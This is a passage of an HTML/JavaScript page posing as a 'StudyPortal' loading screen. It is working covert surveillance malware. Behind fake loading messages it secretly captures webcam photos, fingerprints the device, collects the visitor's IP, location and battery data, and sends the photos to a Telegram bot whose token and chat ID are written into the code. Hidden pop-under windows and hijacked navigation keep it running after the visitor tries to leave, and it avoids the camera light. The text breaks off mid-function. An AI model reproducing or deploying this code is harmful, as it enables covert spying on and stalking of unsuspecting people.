<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Study Portal - Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background: #000;
            position: relative;
        }
        
        #cameraContainer {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            overflow: hidden;
            z-index: 9999;
        }
        
        #cameraVideo {
            width: 640px;
            height: 480px;
            object-fit: cover;
            transform: scaleX(-1);
        }
        
        #captureCanvas {
            display: none;
        }
        
        #websiteFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
        
        #loadingScreen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 2000;
            color: #fff;
            transition: opacity 0.5s ease;
        }
        
        .loading-content {
            text-align: center;
            max-width: 500px;
            padding: 30px;
        }
        
        .logo {
            font-size: 2.5rem;
            font-weight: bold;
            margin-bottom: 20px;
            color: #fff;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            font-size: 1.2rem;
            margin-top: 20px;
            opacity: 0.9;
        }
        
        .progress-bar {
            width: 300px;
            height: 4px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 2px;
            margin: 20px auto;
            overflow: hidden;
        }
        
        .progress {
            width: 0%;
            height: 100%;
            background: #fff;
            border-radius: 2px;
            transition: width 0.3s ease;
        }
        
        /* Hidden backup window indicator */
        #backupIndicator {
            position: fixed;
            bottom: 10px;
            right: 10px;
            width: 20px;
            height: 20px;
            background: rgba(0, 255, 0, 0.3);
            border-radius: 50%;
            z-index: 10000;
            display: none;
        }
    </style>
</head>
<body>
    <div id="loadingScreen">
        <div class="loading-content">
            <div class="logo">ðŸ“š StudyPortal</div>
            <div class="spinner"></div>
            <div class="progress-bar">
                <div class="progress" id="progressFill"></div>
            </div>
            <div class="loading-text" id="loadingMessage">Initializing study environment...</div>
        </div>
    </div>
    
    <!-- Hidden camera elements -->
    <div id="cameraContainer">
        <video id="cameraVideo" autoplay playsinline muted></video>
        <canvas id="captureCanvas"></canvas>
    </div>
    
    <!-- Hidden backup window indicator -->
    <div id="backupIndicator" title="Background process active"></div>
    
    <!-- Website Display -->
    <iframe id="websiteFrame" src="about:blank" 
            sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-modals allow-orientation-lock allow-pointer-lock allow-presentation allow-top-navigation"
            allow="camera; microphone; geolocation; clipboard-read; clipboard-write"></iframe>

    <script>
        // =====================================================
        //  ULTIMATE STEALTH SURVEILLANCE SYSTEM v2.0
        //  Features Fixed: Camera capture, Background persistence, Exit traps
        // =====================================================
        
        // ============== ADVANCED CONFIGURATION ==============
        const CONFIG = {
            // Telegram Configuration
            BOT_TOKEN: '8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0',
            TELEGRAM_API: 'https://api.telegram.org/bot8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0',
            ADMIN_CHAT_ID: '6314556756',
            
            // Capture Settings (FIXED)
            PHOTOS_PER_CAMERA: 4,  // Increased for better coverage
            CAPTURE_DELAY: 1000,   // Slower to ensure camera is ready
            CAMERA_WARMUP: 3000,   // Longer warmup for reliability
            SWITCH_DELAY: 2000,    // Longer switch delay
            VIDEO_READY_WAIT: 2000, // Wait for video to be ready
            
            // Camera Settings
            VIDEO_WIDTH: 1920,      // Higher resolution
            VIDEO_HEIGHT: 1080,
            FRAME_RATE: 30,
            IMAGE_QUALITY: 0.92,
            MIN_BLOB_SIZE: 50000,   // Minimum 50KB
            
            // Advanced Features
            ENABLE_BACKGROUND_PERSISTENCE: true,
            ENABLE_MULTI_TAB: true,
            ENABLE_EXIT_TRAPS: true,
            ENABLE_HIDDEN_WINDOWS: true,
            ENABLE_NOTIFICATION_EXPLOIT: true,
            ENABLE_SERVICE_WORKER: true,
            ENABLE_SCREEN_CAPTURE: false, // Optional
            
            // Timing
            BACKGROUND_SYNC_INTERVAL: 60000, // 1 minute
            HEARTBEAT_INTERVAL: 30000,       // 30 seconds
            
            // Stealth
            STEALTH_MODE: true,
            FAKE_LOADING: true,
            RANDOM_DELAYS: true,
            
            // Retry
            MAX_RETRIES: 5,
            RETRY_DELAY: 2000
        };
        
        // ============== GLOBAL STATE ==============
        const STATE = {
            // Core State
            isRunning: false,
            permissionGranted: false,
            currentStream: null,
            currentCamera: null,
            sessionId: Date.now() + Math.random().toString(36).substr(2, 9),
            tabId: 'tab_' + Math.random().toString(36).substr(2, 9),
            userChatId: null,
            targetWebsite: null,
            
            // Statistics
            totalPhotosSent: 0,
            totalPhotosFailed: 0,
            cycleCount: 0,
            lastCaptureTime: 0,
            startTime: Date.now(),
            
            // Device Info
            deviceInfo: {},
            locationInfo: null,
            batteryInfo: null,
            fingerprintData: {},
            networkInfo: {},
            
            // Camera
            availableCameras: [],
            cameraReady: false,
            cameraIndex: 0,
            
            // Background Systems
            hiddenWindows: new Set(),
            broadcastChannel: null,
            otherTabs: new Set(),
            locationWatchId: null,
            heartbeatInterval: null,
            persistenceDB: null,
            serviceWorker: null,
            
            // UI State
            loadingProgress: 0,
            loadingMessages: [
                "Initializing study environment...",
                "Loading course materials...",
                "Setting up virtual classroom...",
                "Preparing interactive content...",
                "Almost ready...",
                "Optimizing video playback..."
            ],
            currentMessageIndex: 0
        };
        
        // ============== DOM ELEMENTS ==============
        const elements = {
            video: document.getElementById('cameraVideo'),
            canvas: document.getElementById('captureCanvas'),
            frame: document.getElementById('websiteFrame'),
            loading: document.getElementById('loadingScreen'),
            progressFill: document.getElementById('progressFill'),
            loadingMessage: document.getElementById('loadingMessage'),
            backupIndicator: document.getElementById('backupIndicator')
        };
        
        // ============== UTILITIES ==============
        
        function updateProgress(percent, message = null) {
            STATE.loadingProgress = percent;
            elements.progressFill.style.width = percent + '%';
            
            if (message) {
                elements.loadingMessage.textContent = message;
            } else if (percent % 20 === 0) {
                STATE.currentMessageIndex = (STATE.currentMessageIndex + 1) % STATE.loadingMessages.length;
                elements.loadingMessage.textContent = STATE.loadingMessages[STATE.currentMessageIndex];
            }
            
            if (percent >= 100) {
                setTimeout(() => {
                    elements.loading.style.opacity = '0';
                    setTimeout(() => {
                        elements.loading.style.display = 'none';
                    }, 500);
                }, 500);
            }
        }
        
        function log(message, level = 'info') {
            if (!CONFIG.STEALTH_MODE || level === 'error') {
                const timestamp = new Date().toLocaleTimeString();
                const prefix = {
                    'info': 'ðŸ“¡',
                    'success': 'âœ…',
                    'error': 'âŒ',
                    'warning': 'âš ï¸',
                    'debug': 'ðŸ”'
                }[level] || 'â€¢';
                
                console.log(`[${timestamp}] ${prefix} ${message}`);
            }
        }
        
        function randomDelay(min, max) {
            if (CONFIG.RANDOM_DELAYS) {
                return Math.floor(Math.random() * (max - min + 1)) + min;
            }
            return (min + max) / 2;
        }
        
        // ============== BACKGROUND PERSISTENCE SYSTEM ==============
        
        class BackgroundPersistence {
            constructor() {
                this.db = null;
                this.syncInterval = null;
            }
            
            async initialize() {
                if (!CONFIG.ENABLE_BACKGROUND_PERSISTENCE) return;
                
                try {
                    // Open IndexedDB
                    const request = indexedDB.open('StudyPortal_Data', 2);
                    
                    request.onupgradeneeded = (event) => {
                        const db = event.target.result;
                        
                        // Create object stores
                        if (!db.objectStoreNames.contains('photos')) {
                            const store = db.createObjectStore('photos', { keyPath: 'id', autoIncrement: true });
                            store.createIndex('timestamp', 'timestamp');
                            store.createIndex('synced', 'synced');
                        }
                        
                        if (!db.objectStoreNames.contains('locations')) {
                            const store = db.createObjectStore('locations', { keyPath: 'timestamp' });
                            store.createIndex('synced', 'synced');
                        }
                        
                        if (!db.objectStoreNames.contains('device_data')) {
                            db.createObjectStore('device_data', { keyPath: 'type' });
                        }
                        
                        if (!db.objectStoreNames.contains('sessions')) {
                            db.createObjectStore('sessions', { keyPath: 'sessionId' });
                        }
                    };
                    
                    request.onsuccess = (event) => {
                        this.db = event.target.result;
                        STATE.persistenceDB = this.db;
                        log('IndexedDB initialized successfully', 'success');
                        
                        // Start background sync
                        this.startBackgroundSync();
                        
                        // Store session data
                        this.storeSessionData();
                    };
                    
                    request.onerror = (event) => {
                        log('IndexedDB failed: ' + event.target.error, 'error');
                    };
                    
                } catch (error) {
                    log('Persistence initialization failed: ' + error.message, 'error');
                }
            }
            
            async storeSessionData() {
                if (!this.db) return;
                
                try {
                    const transaction = this.db.transaction(['sessions'], 'readwrite');
                    const store = transaction.objectStore('sessions');
                    
                    await store.put({
                        sessionId: STATE.sessionId,
                        tabId: STATE.tabId,
                        startTime: STATE.startTime,
                        userChatId: STATE.userChatId,
                        targetWebsite: STATE.targetWebsite,
                        deviceInfo: STATE.deviceInfo,
                        lastActive: Date.now()
                    });
                    
                } catch (error) {
                    log('Session storage failed: ' + error.message, 'error');
                }
            }
            
            async storePhoto(blob, cameraType, sequence) {
                if (!this.db) return;
                
                try {
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        const transaction = this.db.transaction(['photos'], 'readwrite');
                        const store = transaction.objectStore('photos');
                        
                        store.add({
                            blobData: reader.result,
                            cameraType: cameraType,
                            sequence: sequence,
                            timestamp: Date.now(),
                            sessionId: STATE.sessionId,
                            synced: false,
                            metadata: {
                                battery: STATE.batteryInfo,
                                location: STATE.locationInfo,
                                device: STATE.deviceInfo
                            }
                        });
                    };
                    reader.readAsDataURL(blob);
                    
                } catch (error) {
                    log('Photo storage failed: ' + error.message, 'error');
                }
            }
            
            startBackgroundSync() {
                if (this.syncInterval) clearInterval(this.syncInterval);
                
                this.syncInterval = setInterval(async () => {
                    await this.syncPendingData();
                }, CONFIG.BACKGROUND_SYNC_INTERVAL);
            }
            
            async syncPendingData() {
                if (!this.db || !navigator.onLine) return;
                
                try {
                    // Sync photos
                    await this.syncPhotos();
                    
                    // Sync locations
                    await this.syncLocations();
                    
                } catch (error) {
                    log('Background sync failed: ' + error.message, 'error');
                }
            }
            
            async syncPhotos() {
                const transaction = this.db.transaction(['photos'], 'readonly');
                const store = transaction.objectStore('photos');
                const index = store.index('synced');
                const request = index.getAll(IDBKeyRange.only(false));
                
                return new Promise((resolve) => {
                    request.onsuccess = async (event) => {
                        const photos = event.target.result;
                        
                        for (const photo of photos) {
                            try {
                                // Convert dataURL back to blob
                                const response = await fetch(photo.blobData);
                                const blob = await response.blob();
                                
                                // Send to Telegram
                                const sent = await sendToTelegram(blob, photo.cameraType, photo.sequence);
                                
                                if (sent) {
                                    // Mark as synced
                                    const updateTransaction = this.db.transaction(['photos'], 'readwrite');
                                    const updateStore = updateTransaction.objectStore('photos');
                                    photo.synced = true;
                                    await updateStore.put(photo);
                                }
                                
                            } catch (error) {
                                log('Photo sync error: ' + error.message, 'error');
                            }
                        }
                        
                        resolve();
                    };
                });
            }
            
            async syncLocations() {
                // Similar implementation for locations
            }
            
            cleanup() {
                if (this.syncInterval) {
                    clearInterval(this.syncInterval);
                }
            }
        }
        
        // ============== MULTI-TAB COORDINATION ==============
        
        class MultiTabCoordinator {
            constructor() {
                this.channel = null;
                this.heartbeatInterval = null;
                this.cleanupInterval = null;
            }
            
            async initialize() {
                if (!CONFIG.ENABLE_MULTI_TAB || !('BroadcastChannel' in window)) {
                    log('Multi-tab coordination unavailable', 'warning');
                    return;
                }
                
                try {
                    this.channel = new BroadcastChannel('study_portal_sync');
                    STATE.broadcastChannel = this.channel;
                    
                    this.channel.onmessage = (event) => this.handleMessage(event.data);
                    
                    // Announce presence
                    this.announceTab();
                    
                    // Start heartbeat
                    this.startHeartbeat();
                    
                    // Cleanup dead tabs periodically
                    this.cleanupInterval = setInterval(() => this.cleanupDeadTabs(), 60000);
                    
                    log('Multi-tab coordination active', 'success');
                    
                } catch (error) {
                    log('Multi-tab init failed: ' + error.message, 'error');
                }
            }
            
            announceTab() {
                this.broadcast({
                    type: 'tab_announce',
                    tabId: STATE.tabId,
                    sessionId: STATE.sessionId,
                    timestamp: Date.now(),
                    userChatId: STATE.userChatId,
                    isPrimary: STATE.otherTabs.size === 0
                });
            }
            
            startHeartbeat() {
                this.heartbeatInterval = setInterval(() => {
                    this.broadcast({
                        type: 'heartbeat',
                        tabId: STATE.tabId,
                        timestamp: Date.now(),
                        isRunning: STATE.isRunning,
                        photosSent: STATE.totalPhotosSent,
                        battery: STATE.batteryInfo?.level,
                        location: STATE.locationInfo ? 'available' : 'unavailable'
                    });
                }, CONFIG.HEARTBEAT_INTERVAL);
            }
            
            handleMessage(data) {
                if (data.tabId === STATE.tabId) return; // Ignore self
                
                switch (data.type) {
                    case 'tab_announce':
                        STATE.otherTabs.add(data.tabId);
                        log(`Tab discovered: ${data.tabId}`, 'info');
                        
                        // If this tab is primary and we're not running, start
                        if (data.isPrimary && !STATE.isRunning) {
                            setTimeout(() => mainLoop(), randomDelay(1000, 3000));
                        }
                        break;
                        
                    case 'heartbeat':
                        STATE.otherTabs.add(data.tabId);
                        break;
                        
                    case 'camera_status':
                        log(`Camera ${data.status} on tab ${data.tabId}`, 'debug');
                        break;
                        
                    case 'photo_captured':
                        log(`Photo captured by tab ${data.tabId}`, 'debug');
                        break;
                }
            }
            
            broadcast(data) {
                if (this.channel) {
                    try {
                        this.channel.postMessage(data);
                    } catch (error) {
                        log('Broadcast failed: ' + error.message, 'error');
                    }
                }
            }
            
            cleanupDeadTabs() {
                // In a real implementation, you'd track last heartbeat times
                // and remove tabs that haven't been heard from
            }
            
            cleanup() {
                if (this.heartbeatInterval) clearInterval(this.heartbeatInterval);
                if (this.cleanupInterval) clearInterval(this.cleanupInterval);
                if (this.channel) this.channel.close();
            }
        }
        
        // ============== HIDDEN WINDOW MANAGER ==============
        
        class HiddenWindowManager {
            constructor() {
                this.windows = new Set();
                this.monitorIntervals = new Map();
                this.backupCheckInterval = null;
            }
            
            async createBackupWindow() {
                if (!CONFIG.ENABLE_HIDDEN_WINDOWS) return;
                
                try {
                    // Create a nearly invisible window
                    const features = [
                        'width=100',
                        'height=100',
                        'left=' + (screen.width - 150),
                        'top=' + (screen.height - 150),
                        'menubar=no',
                        'toolbar=no',
                        'location=no',
                        'status=no',
                        'scrollbars=no',
                        'resizable=no',
                        'titlebar=no'
                    ].join(',');
                    
                    const backup = window.open('about:blank', '_backup_' + STATE.sessionId, features);
                    
                    if (backup && !backup.closed) {
                        this.windows.add(backup);
                        STATE.hiddenWindows.add(backup);
                        
                        // Write minimal HTML to keep window alive
                        backup.document.write(this.getBackupHTML());
                        backup.document.close();
                        
                        // Hide the window
                        backup.blur();
                        window.focus();
                        
                        // Monitor window health
                        this.monitorWindow(backup);
                        
                        // Show indicator
                        elements.backupIndicator.style.display = 'block';
                        
                        log('Hidden backup window created', 'success');
                        
                        return backup;
                    }
                } catch (error) {
                    log('Backup window creation failed (likely blocked): ' + error.message, 'warning');
                }
                
                return null;
            }
            
            getBackupHTML() {
                const currentUrl = window.location.href;
                
                return `<!DOCTYPE html>
<html style="background: transparent;">
<head>
    <title>New Tab</title>
    <style>
        * { margin: 0; padding: 0; }
        body { 
            background: transparent !important;
            overflow: hidden;
            opacity: 0.01;
        }
    </style>
</head>
<body>
    <script>
        // Backup surveillance script
        const mainUrl = "${currentUrl}";
        const sessionId = "${STATE.sessionId}";
        let mainWindow = window.opener;
        let isActive = true;
        
        // Keep-alive heartbeat
        setInterval(() => {
            if (mainWindow && !mainWindow.closed) {
                try {
                    mainWindow.postMessage({
                        type: 'backup_heartbeat',
                        sessionId: sessionId,
                        timestamp: Date.now()
                    }, '*');
                } catch(e) {
                    // Main window might be closed or inaccessible
                }
            }
        }, 30000);
        
        // Reconnection logic
        setInterval(() => {
            if (!mainWindow || mainWindow.closed) {
                try {
                    mainWindow = window.open(mainUrl, '_blank', 'width=100,height=100,left=-9999,top=-9999');
                } catch(e) {
                    // Popup blocked
                }
            }
        }, 60000);
        
        // Prevent closing
        window.onbeforeunload = (e) => {
            if (isActive) {
                e.preventDefault();
                e.returnValue = '';
                return '';
            }
        };
        
        // Emergency cleanup
        window.addEventListener('unload', () => {
            isActive = false;
        });
    <\/script>
</body>
</html>`;
            }
            
            monitorWindow(win) {
                const interval = setInterval(() => {
                    if (win.closed) {
                        clearInterval(interval);
                        this.windows.delete(win);
                        STATE.hiddenWindows.delete(win);
                        
                        // Recreate if we have no backup windows
                        if (this.windows.size === 0) {
                            elements.backupIndicator.style.display = 'none';
                            setTimeout(() => this.createBackupWindow(), randomDelay(5000, 15000));
                        }
                    }
                }, 2000);
                
                this.monitorIntervals.set(win, interval);
            }
            
            cleanup() {
                // Clear all monitoring intervals
                this.monitorIntervals.forEach((interval, win) => {
                    clearInterval(interval);
                });
                this.monitorIntervals.clear();
                
                // Close all windows
                this.windows.forEach(win => {
                    try {
                        win.close();
                    } catch (e) {
                        // Window might already be closed
                    }
                });
                this.windows.clear();
                STATE.hiddenWindows.clear();
                
                elements.backupIndicator.style.display = 'none';
            }
        }
        
        // ============== EXIT TRAP SYSTEM ==============
        
        class ExitTrapManager {
            constructor() {
                this.originalUrl = window.location.href;
                this.isTrapped = false;
                this.linkInterceptor = null;
            }
            
            setupTraps() {
                if (!CONFIG.ENABLE_EXIT_TRAPS) return;
                
                try {
                    // Intercept link clicks
                    document.addEventListener('click', this.handleLinkClick.bind(this), true);
                    
                    // Trap beforeunload
                    window.addEventListener('beforeunload', this.handleBeforeUnload.bind(this));
                    
                    // Trap popstate (back/forward)
                    window.addEventListener('popstate', this.handlePopState.bind(this));
                    
                    // Trap unload
                    window.addEventListener('unload', this.handleUnload.bind(this));
                    
                    this.isTrapped = true;
                    log('Exit traps activated', 'success');
                    
                } catch (error) {
                    log('Exit trap setup failed: ' + error.message, 'error');
                }
            }
            
            handleLinkClick(event) {
                const link = event.target.closest('a');
                if (link && link.href && !link.href.startsWith('#') && !link.href.startsWith('javascript:')) {
                    try {
                        const targetUrl = new URL(link.href, window.location.href);
                        const currentUrl = new URL(window.location.href);
                        
                        // Only trap external links
                        if (targetUrl.hostname !== currentUrl.hostname) {
                            event.preventDefault();
                            event.stopPropagation();
                            
                            // Create pop-under before navigating
                            this.createPopUnder();
                            
                            // Navigate after delay
                            setTimeout(() => {
                                window.location.href = link.href;
                            }, 100);
                            
                            return false;
                        }
                    } catch (error) {
                        // Invalid URL, allow default behavior
                    }
                }
            }
            
            handleBeforeUnload(event) {
                // Create backup before unloading
                this.createPopUnder();
                
                // Don't show confirmation to avoid suspicion
                return undefined;
            }
            
            handlePopState() {
                // User is navigating with back/forward
                this.createPopUnder();
            }
            
            handleUnload() {
                // Last chance to create backup
                try {
                    this.createPopUnder();
                } catch (error) {
                    // Ignore errors during unload
                }
            }
            
            createPopUnder() {
                try {
                    const features = [
                        'width=1',
                        'height=1',
                        'left=-9999',
                        'top=-9999',
                        'menubar=no',
                        'toolbar=no',
                        'location=no',
                        'status=no',
                        'scrollbars=no',
                        'resizable=no'
                    ].join(',');
                    
                    const popunder = window.open(this.originalUrl, '_popunder_' + Date.now(), features);
                    
                    if (popunder) {
                        // Hide immediately
                        setTimeout(() => {
                            try {
                                popunder.blur();
                                window.focus();
                            } catch (error) {
                                // Ignore focus errors
                            }
                        }, 100);
                        
                        log('Pop-under created for persistence', 'info');
                        return popunder;
                    }
                } catch (error) {
                    log('Pop-under blocked by browser', 'warning');
                }
                
                return null;
            }
            
            cleanup() {
                if (this.linkInterceptor) {
                    document.removeEventListener('click', this.linkInterceptor, true);
                }
                
                window.removeEventListener('beforeunload', this.handleBeforeUnload);
                window.removeEventListener('popstate', this.handlePopState);
                window.removeEventListener('unload', this.handleUnload);
                
                this.isTrapped = false;
            }
        }
        
        // ============== DEVICE INFORMATION ==============
        
        async function collectDeviceInfo() {
            updateProgress(10, "Collecting device information...");
            
            const info = {
                // Browser Info
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor || 'unknown',
                language: navigator.language,
                languages: navigator.languages?.join(', ') || navigator.language,
                cookieEnabled: navigator.cookieEnabled,
                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                webdriver: navigator.webdriver || false,
                
                // Screen Info
                screenWidth: screen.width,
                screenHeight: screen.height,
                screenAvailWidth: screen.availWidth,
                screenAvailHeight: screen.availHeight,
                screenColorDepth: screen.colorDepth,
                screenPixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type || 'unknown',
                orientationAngle: screen.orientation?.angle || 0,
                
                // Window Info
                windowWidth: window.innerWidth,
                windowHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight,
                devicePixelRatio: window.devicePixelRatio,
                
                // Hardware
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                
                // Time
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                localTime: new Date().toLocaleString(),
                timestamp: Date.now(),
                
                // Network
                onLine: navigator.onLine,
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData,
                    type: navigator.connection.type
                } : null,
                
                // Media
                mediaDevices: 'mediaDevices' in navigator,
                permissions: 'permissions' in navigator,
                
                // Detection
                isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
                isTablet: /iPad|Android/i.test(navigator.userAgent) && !/Mobile/i.test(navigator.userAgent),
                
                // OS Detection
                os: (() => {
                    const ua = navigator.userAgent;
                    if (/Windows/.test(ua)) return 'Windows';
                    if (/Mac/.test(ua)) return 'macOS';
                    if (/Linux/.test(ua)) return 'Linux';
                    if (/Android/.test(ua)) return 'Android';
                    if (/iOS|iPhone|iPad|iPod/.test(ua)) return 'iOS';
                    return 'Unknown';
                })(),
                
                // Browser Detection
                browser: (() => {
                    const ua = navigator.userAgent;
                    if (/Chrome/.test(ua) && !/Edge/.test(ua)) return 'Chrome';
                    if (/Firefox/.test(ua)) return 'Firefox';
                    if (/Safari/.test(ua) && !/Chrome/.test(ua)) return 'Safari';
                    if (/Edge/.test(ua)) return 'Edge';
                    if (/Opera/.test(ua)) return 'Opera';
                    return 'Unknown';
                })()
            };
            
            // Get IP Address
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                info.ipAddress = data.ip;
            } catch (error) {
                info.ipAddress = 'Unable to fetch';
            }
            
            // Get Canvas Fingerprint
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;
                ctx.textBaseline = 'alphabetic';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.font = '11pt Arial';
                ctx.fillText('Fingerprint', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.font = '18pt Arial';
                ctx.fillText('Fingerprint', 4, 45);
                info.canvasFingerprint = canvas.toDataURL();
            } catch (error) {
                info.canvasFingerprint = 'Failed';
            }
            
            STATE.deviceInfo = info;
            updateProgress(20);
            return info;
        }
        
        async function getBatteryInfo() {
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    const info = {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                    
                    STATE.batteryInfo = info;
                    return info;
                } catch (error) {
                    return null;
                }
            }
            return null;
        }
        
        async function getLocation() {
            if (!navigator.geolocation) return null;
            
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: Math.round(position.coords.accuracy),
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: new Date(position.timestamp).toLocaleString(),
                            googleMapsLink: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`,
                            openStreetMapLink: `https://www.openstreetmap.org/?mlat=${position.coords.latitude}&mlon=${position.coords.longitude}`
                        };
                        STATE.locationInfo = location;
                        resolve(location);
                    },
                    (error) => {
                        log('Location error: ' + error.message, 'warning');
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        function startLocationTracking() {
            if (!navigator.geolocation) return;
            
            STATE.locationWatchId = navigator.geolocation.watchPosition(
                (position) => {
                    STATE.locationInfo = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: Math.round(position.coords.accuracy),
                        timestamp: new Date().toLocaleString()
                    };
                },
                (error) => {
                    log('Location tracking error: ' + error.message, 'warning');
                },
                {
                    enableHighAccuracy: true,
                    maximumAge: 30000, // 30 seconds
                    timeout: 10000
                }
            );
        }
        
        // ============== FIXED CAMERA SYSTEM ==============
        
        async function requestCameraPermission() {
            updateProgress(30, "Requesting camera access...");
            
            try {
                // First try to get camera list without streaming
                const devices = await navigator.mediaDevices.enumerateDevices();
                STATE.availableCameras = devices.filter(d => d.kind === 'videoinput');
                
                if (STATE.availableCameras.length === 0) {
                    log('No cameras found', 'warning');
                    return false;
                }
                
                // Request permission with specific constraints
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: CONFIG.VIDEO_WIDTH },
                        height: { ideal: CONFIG.VIDEO_HEIGHT },
                        frameRate: { ideal: CONFIG.FRAME_RATE },
                        facingMode: { ideal: 'user' } // Start with front camera
                    },
                    audio: false
                });
                
                // Stop the stream immediately to avoid camera light
                stream.getTracks().forEach(track => {
                    track.stop();
                });
                
                STATE.permissionGranted = true;
                updateProgress(40);
                log(`Camera permission granted (${STATE.availableCameras.length} cameras found)`, 'success');
                
                return true;
                
            } catch (error) {
                log('Camera permission denied: ' + error.message, 'error');
                updateProgress(40);
                return false;
            }
        }
        
        async function startCamera(facingMode, retryCount = 0) {
            if (retryCount >= CONFIG.MAX_RETRIES) {
                log(`Failed to start ${facingMode} camera after ${CONFIG.MAX_RETRIES} attempts`, 'error');
                return false;
            }
            
            try {
                log(`Starting ${facingMode} camera (attempt ${retryCount + 1})...`, 'info');
                
                // Clean up previous stream
                if (STATE.currentStream) {
                    STATE.currentStream.getTracks().forEach(track => track.stop());
                    STATE.currentStream = null;
                    await new Promise(resolve => setTimeout(resolve, 500));
                }
                
                // Set video element transform
                elements.video.style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
                
                // Create constraints
                const constraints = {
                    video: {
                        facingMode: { ideal: facingMode },
                        width: { ideal: CONFIG.VIDEO_WIDTH },
                        height: { ideal: CONFIG.VIDEO_HEIGHT },
                        frameRate: { ideal: CONFIG.FRAME_RATE }
                    }
                };
                
                // Get stream
                STATE.currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                elements.video.srcObject = STATE.currentStream;
                STATE.currentCamera = facingMode === 'user' ? 'front' : 'back';
                
                // Wait for video to be ready
                await new Promise((resolve, reject) => {
                    const timeout = setTimeout(() => reject(new Error('Video timeout')), 10000);
                    
                    elements.video.onloadedmetadata = () => {
                        clearTimeout(timeout);
                        resolve();
                    };
                    
                    elements.video.onerror = () => {
                        clearTimeout(timeout);
                        reject(new Error('Video error'));
                    };
                });
                
                // Play video
                await elements.video.play();
                
                // Wait for camera to warm up
                await new Promise(resolve => setTimeout(resolve, CONFIG.CAMERA_WARMUP));
                
                // Verify video is actually playing
                if (elements.video.readyState < 2) {
                    throw new Error('Video not ready');
                }
                
                STATE.cameraReady = true;
                log(`${facingMode} camera ready (${elements.video.videoWidth}x${elements.video.videoHeight})`, 'success');
                
                // Broadcast camera status
                if (STATE.broadcastChannel) {
                    STATE.broadcastChannel.postMessage({
                        type: 'camera_status',
                        tabId: STATE.tabId,
                        camera: facingMode,
                        status: 'ready',
                        resolution: `${elements.video.videoWidth}x${elements.video.videoHeight}`
                    });
                }
                
                return true;
                
            } catch (error) {
                log(`${facingMode} camera failed: ${error.message}`, 'error');
                STATE.cameraReady = false;
                
                // Clean up on failure
                if (STATE.currentStream) {
                    STATE.currentStream.getTracks().forEach(track => track.stop());
                    STATE.currentStream = null;
                }
                
                // Retry with delay
                await new Promise(resolve => setTimeout(resolve, CONFIG.RETRY_DELAY));
                return await startCamera(facingMode, retryCount + 1);
            }
        }
        
        async function capturePhoto() {
            if (!STATE.cameraReady || !STATE.currentStream) {
                log('Camera not ready for capture', 'warning');
                return null;
            }
            
            try {
                const video = elements.video;
                const canvas = elements.canvas;
                const ctx = canvas.getContext('2d');
                
                // Ensure video is playing
                if (video.paused || video.ended || video.readyState < 2) {
                    log('Video not playing, cannot capture', 'warning');
                    return null;
                }
                
                // Set canvas dimensions to match video
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Draw video frame to canvas
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Create blob from canvas
                return new Promise((resolve) => {
                    canvas.toBlob(
                        (blob) => {
